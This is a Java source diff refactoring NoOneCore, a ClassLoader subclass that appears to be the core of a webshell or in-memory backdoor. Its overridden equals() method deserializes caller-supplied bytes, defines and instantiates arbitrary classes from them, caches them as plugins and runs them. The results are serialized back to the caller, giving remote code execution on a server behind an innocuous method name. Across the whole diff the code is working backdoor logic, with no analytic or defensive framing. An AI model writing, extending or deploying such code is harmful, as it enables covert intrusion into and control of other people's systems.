@@ -17,15 +17,16 @@ public class NoOneCore extends ClassLoader {
     private static final String PLUGIN = "plugin";
     private static final String CLASS_BYTES = "classBytes";
     private static final String ARGS = "args";
-    private static final String METHOD_NAME = "methodName";
 
     private static final String REFRESH = "refresh";
     private static final String CLASS_DEFINE = "classDefine";
     private static final String CLASS_RUN = "classRun";
     private static final String PLUGIN_CACHES = "pluginCaches";
+    private static final String GLOBAL_CACHES = "globalCaches";
 
     private static final String ACTION_STATUS = "status";
     private static final String ACTION_RUN = "run";
+    private static final String ACTION_LOAD = "load";
     private static final String ACTION_CLEAN = "clean";
 
     private static final String CODE = "code";
@@ -34,21 +35,11 @@ public class NoOneCore extends ClassLoader {
     private static final int SUCCESS = 0;
     private static final int FAILURE = 1;
 
-    // plugin to clazz
-    public static Map<String, Class<?>> loadedPluginCache = new ConcurrentHashMap<String, Class<?>>();
-
-    private static NoOneCore classDefiner = new NoOneCore(Thread.currentThread().getContextClassLoader());
-
-    private Object parentObj;
-    private OutputStream outputStream;
-    private Writer writer;
-    private byte[] inputBytes;
+    // pluginName to pluginObject
+    public static Map<String, Object> loadedPluginCache = new ConcurrentHashMap<String, Object>();
+    public static Map<String, Object> globalCaches = new ConcurrentHashMap<String, Object>();
 
     public NoOneCore() {
-    }
-
-    public NoOneCore(Object parentObj) {
-        this.parentObj = parentObj;
     }
 
     public NoOneCore(ClassLoader parent) {
@@ -57,138 +48,104 @@ public class NoOneCore extends ClassLoader {
 
     @Override
     public boolean equals(Object obj) {
-        Object[] args = (Object[]) obj;
-        Object input = args[0];
-        Object output = args[1];
-        if (input instanceof InputStream) {
-            inputBytes = toByteArray((InputStream) input);
-        } else if (input instanceof byte[]) {
-            inputBytes = (byte[]) input;
-        } else if (input instanceof String) {
-            inputBytes = ((String) input).getBytes();
+        byte[] inputBytes = (byte[]) ((Object[]) obj)[0];
+        OutputStream outputStream = (OutputStream) ((Object[]) obj)[1];
+        if (inputBytes != null && outputStream != null) {
+            Map<String, Object> result = new LinkedHashMap<String, Object>();
+            result.put(CODE, SUCCESS);
+            Map<String, Object> args = new HashMap<String, Object>();
+            try {
+                args = deserialize(inputBytes);
+            } catch (Throwable e) {
+                result.put(CODE, FAILURE);
+                result.put(ERROR, getStackTraceAsString(new RuntimeException("args parsed failed, " + e.getMessage(), e)));
+            }
+            String action = (String) args.get(ACTION);
+            if (action != null) {
+                try {
+                    switch (action) {
+                        case ACTION_STATUS:
+                            result.putAll(getStatus());
+                            break;
+                        case ACTION_RUN:
+                            result.putAll(run(args));
+                            break;
+                        case ACTION_LOAD:
+                            Object loaded = load(args, result);
+                            result.put(DATA, loaded != null);
+                            break;
+                        case ACTION_CLEAN:
+                            loadedPluginCache.clear();
+                            break;
+                        default:
+                            result.put(CODE, FAILURE);
+                            result.put(ERROR, "action [" + action + "] not supported");
+                            break;
+                    }
+                } catch (Throwable e) {
+                    result.put(CODE, FAILURE);
+                    result.put(ERROR, getStackTraceAsString(new RuntimeException("action [" + action + "] run failed, " + e.getMessage(), e)));
+                }
+            }
+            try {
+                byte[] bytes = serialize(result);
+                outputStream.write(bytes, 0, bytes.length);
+                outputStream.flush();
+                outputStream.close();
+            } catch (Throwable ignored) {
+            }
         }
-        if (output instanceof OutputStream) {
-            outputStream = (OutputStream) output;
-        } else if (output instanceof Writer) {
-            writer = (Writer) output;
-        }
-        return (outputStream != null || writer != null) &&
-                (inputBytes != null);
+        return false;
     }
 
     private Class<?> defineClass(String className, byte[] bytes) {
         return super.defineClass(className, bytes, 0, bytes.length);
     }
 
-    @Override
-    public String toString() {
-        Map<String, Object> result = new LinkedHashMap<String, Object>();
-        result.put(CODE, SUCCESS);
-        Map<String, Object> args = new HashMap<String, Object>();
-        try {
-            args = deserialize(inputBytes);
-        } catch (Throwable e) {
-            result.put(CODE, FAILURE);
-            result.put(ERROR, getStackTraceAsString(new RuntimeException("args parsed failed, " + e.getMessage(), e)));
-        }
-        String action = (String) args.get(ACTION);
-        if (action != null) {
-            try {
-                if (ACTION_STATUS.equals(action)) {
-                    result.putAll(getStatus());
-                } else if (ACTION_RUN.equals(action)) {
-                    result.putAll(run(args));
-                } else if (ACTION_CLEAN.equals(action)) {
-                    loadedPluginCache.clear();
-                    classDefiner = null;
-                } else {
-                    result.put(CODE, FAILURE);
-                    result.put(ERROR, "action [" + action + "] not supported");
-                }
-            } catch (Throwable e) {
-                result.put(CODE, FAILURE);
-                result.put(ERROR, getStackTraceAsString(e));
-            }
-        }
-        try {
-            writeResult(result);
-        } catch (Throwable ignored) {
-        }
-        return "ok";
-    }
-
     public Map<String, Object> getStatus() {
         Map<String, Object> result = new HashMap<String, Object>();
-        // plugin to className
-        Map<String, String> caches = new HashMap<String, String>();
-        for (Map.Entry<String, Class<?>> entry : loadedPluginCache.entrySet()) {
-            Class<?> clazz = entry.getValue();
-            String plugin = entry.getKey();
-            caches.put(plugin, clazz.getName());
-        }
-        result.put(PLUGIN_CACHES, caches);
+        result.put(PLUGIN_CACHES, loadedPluginCache.keySet());
         return result;
     }
 
-
-    @SuppressWarnings("unchecked")
-    public Map<String, Object> run(Map<String, Object> args) {
-        Map<String, Object> result = new HashMap<String, Object>();
+    public Object load(Map<String, Object> args, Map<String, Object> result) throws Exception {
         String plugin = (String) args.get(PLUGIN);
         String className = (String) args.get(CLASSNAME);
         byte[] classBytes = (byte[]) args.get(CLASS_BYTES);
         boolean refresh = Boolean.parseBoolean((String) args.get(REFRESH));
-
-        Class<?> clazz = null;
+        Object pluginObj = null;
 
         if (!refresh && plugin != null) {
-            clazz = loadedPluginCache.get(plugin);
+            pluginObj = loadedPluginCache.get(plugin);
         }
-
-        if (clazz == null) {
+        if (pluginObj == null) {
             if (plugin == null) {
                 throw new RuntimeException("plugin is required");
             }
             if (className == null || classBytes == null) {
                 throw new RuntimeException("className and classBytes are required for class loading");
             }
-            try {
-                clazz = classDefiner.defineClass(className, classBytes);
-                loadedPluginCache.put(plugin, clazz);
-                result.put(CLASS_DEFINE, true);
-            } catch (Throwable e) {
-                throw new RuntimeException("class define failed, " + e.getMessage(), e);
-            }
+            pluginObj = new NoOneCore(Thread.currentThread().getContextClassLoader()).defineClass(className, classBytes).newInstance();
+            loadedPluginCache.put(plugin, pluginObj);
+            result.put(CLASS_DEFINE, true);
         }
-
-        try {
-            String methodName = (String) args.get(METHOD_NAME);
-            if (methodName != null) {
-                Map<String, Object> methodArgs = (Map<String, Object>) args.get(ARGS);
-                if (methodArgs == null) {
-                    methodArgs = new HashMap<String, Object>();
-                }
-                methodArgs.put(PLUGIN_CACHES, loadedPluginCache);
-                result.put(DATA, clazz.getMethod(methodName, Map.class).invoke(null, methodArgs));
-                result.put(CLASS_RUN, true);
-            }
-        } catch (Throwable e) {
-            throw new RuntimeException("class run failed, " + e.getMessage(), e);
-        }
-        return result;
+        return pluginObj;
     }
 
-    public void writeResult(Map<String, Object> result) throws IOException {
-        byte[] bytes = serialize(result);
-        if (outputStream != null) {
-            outputStream.write(bytes, 0, bytes.length);
-            outputStream.flush();
-            outputStream.close();
-        } else if (writer != null) {
-            writer.write(new String(bytes, "UTF-8"));
-            writer.flush();
-            writer.close();
+
+    @SuppressWarnings("unchecked")
+    public Map<String, Object> run(Map<String, Object> args) throws Exception {
+        Map<String, Object> result = new HashMap<String, Object>();
+        Object pluginObj = load(args, result);
+        Map<String, Object> map = (Map<String, Object>) args.get(ARGS);
+        if (map == null) {
+            map = new HashMap<String, Object>();
         }
+        map.put(PLUGIN_CACHES, loadedPluginCache);
+        pluginObj.equals(map);
+        result.put(DATA, map.get("result"));
+        result.put(CLASS_RUN, true);
+        return result;
     }
 
     public static byte[] toByteArray(InputStream input) {
